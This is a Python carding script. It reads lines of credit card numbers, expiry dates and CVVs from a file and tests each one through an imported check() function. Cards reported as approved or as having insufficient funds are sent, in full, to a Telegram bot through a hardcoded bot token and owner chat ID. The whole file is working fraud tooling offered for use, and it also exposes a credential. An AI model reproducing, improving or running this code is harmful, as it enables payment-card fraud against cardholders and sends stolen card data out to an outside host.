import random
import time
from cahrged import *

token = "7167034530:AAEtTlUhPeiXRpk2xEZ818MgXHaz0PhMSXs"
IDOWNER = 2093600923
def checssk():
        for visaa in open('dd.txt',"r").read().splitlines():
                visa = visaa.split('|')
                cc = visa[0]
                if len(cc) != 16:
                    continue
                mes = visa[1]
                ano = visa[2]
                if len(ano) == 4:
                    ano = ano[2:]
                cvv = visa[3]
                if len(cvv) != 3:
                    continue
                try: 
                    msg=check(f'{cc}|{mes}|{ano}|{cvv}')
                except:
                    continue
                msg=str(msg)
                pp2kp = "tharwat : )"
                if '_FUNDS' in msg:
                        print(f'\033[1;32m {visaa} \n Your card has insufficient funds. {pp2kp}')
                        print('\033[0m ++++++++++++++++++++++++++++++++')
                        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={IDOWNER}&text=CARD: {cc}|{mes}|{ano}|{cvv} ||MSG ={msg}')
                elif msg== "APPROVED":
                        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={IDOWNER}&text=CARD: {cc}|{mes}|{ano}|{cvv} ||MSG ={msg}')
                        print(f'''
\033[1;32m
CARD: {cc}|{mes}|{ano}|{cvv}
RESPONE : {msg}\n
'''+'+'*25+'\n')
                else:
                        print(f'''
\033[1;33m
CARD: {cc}|{mes}|{ano}|{cvv}
RESPONE : {msg}\n
'''+'+'*25+'\n')
            


checssk()